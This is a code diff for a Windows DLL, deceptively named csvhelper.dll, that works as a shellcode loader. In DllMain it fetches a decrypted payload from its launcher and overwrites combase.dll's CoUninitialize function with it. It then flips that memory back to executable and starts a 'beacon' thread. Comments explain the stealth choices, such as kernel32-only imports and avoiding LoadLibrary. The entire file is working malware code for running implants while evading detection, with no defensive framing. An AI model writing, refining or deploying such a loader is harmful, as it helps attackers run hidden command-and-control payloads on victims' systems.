@@ -1,40 +1,61 @@
 /*
  * plugin.c — csvhelper.dll: combase.dll slot loader
  *
- * Exports PluginRun(plaintext, len) — launcher passes the decrypted PICO,
- * plugin copies it into combase!CoUninitialize, flips RX, spawns thread,
- * returns the thread HANDLE (NULL on any failure).
+ * All work happens in DllMain, which runs synchronously during the
+ * launcher's LoadLibraryA call. Plaintext PICO is retrieved from the
+ * launcher EXE via its GetPayload export, copied into combase's
+ * CoUninitialize slot (RW → memcpy → RX), and the beacon thread handle
+ * is handed back to the launcher through SetThreadHandle.
  *
- * IAT: kernel32 only — LoadLibraryA, GetProcAddress, VirtualProtect,
- * CreateThread. No bcrypt, no advapi32, no filesystem.
+ * combase.dll must already be resident — the launcher pre-loads it so
+ * we resolve with GetModuleHandleW alone, avoiding a LoadLibrary call
+ * under the loader lock.
+ *
+ * IAT: kernel32 only — GetModuleHandleW, GetProcAddress, VirtualProtect,
+ * CreateThread. No LoadLibrary, no bcrypt, no advapi32, no filesystem.
  */
 
 #include <windows.h>
 
+typedef void  (WINAPI *pfnGetPayload)(void **, SIZE_T *);
+typedef void  (WINAPI *pfnSetThreadHandle)(HANDLE);
+
 BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved)
 {
     (void)reserved;
-    if (reason == DLL_PROCESS_ATTACH)
-        DisableThreadLibraryCalls(hinst);
-    return TRUE;
-}
 
-__declspec(dllexport) HANDLE WINAPI PluginRun(const void *pt, SIZE_T len)
-{
-    HMODULE mod = LoadLibraryA("combase.dll");
-    if (!mod) return NULL;
+    if (reason != DLL_PROCESS_ATTACH)
+        return TRUE;
 
-    void *slot = (void *)GetProcAddress(mod, "CoUninitialize");
-    if (!slot) return NULL;
+    DisableThreadLibraryCalls(hinst);
+
+    HMODULE exe = GetModuleHandleW(NULL);
+    if (!exe) return FALSE;
+
+    pfnGetPayload gp = (pfnGetPayload)GetProcAddress(exe, "GetPayload");
+    if (!gp) return FALSE;
+
+    void *pt = NULL;
+    SIZE_T len = 0;
+    gp(&pt, &len);
+    if (!pt || !len) return FALSE;
+
+    HMODULE combase = GetModuleHandleW(L"combase.dll");
+    if (!combase) return FALSE;
+
+    void *slot = (void *)GetProcAddress(combase, "CoUninitialize");
+    if (!slot) return FALSE;
 
     DWORD old;
-    if (!VirtualProtect(slot, len, PAGE_READWRITE, &old))
-        return NULL;
-
+    if (!VirtualProtect(slot, len, PAGE_READWRITE, &old)) return FALSE;
     memcpy(slot, pt, len);
+    if (!VirtualProtect(slot, len, PAGE_EXECUTE_READ, &old)) return FALSE;
 
-    if (!VirtualProtect(slot, len, PAGE_EXECUTE_READ, &old))
-        return NULL;
+    HANDLE t = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)slot, NULL, 0, NULL);
+    if (!t) return FALSE;
 
-    return CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)slot, NULL, 0, NULL);
+    pfnSetThreadHandle sh = (pfnSetThreadHandle)GetProcAddress(exe, "SetThreadHandle");
+    if (sh) sh(t);
+
+    return TRUE;
 }
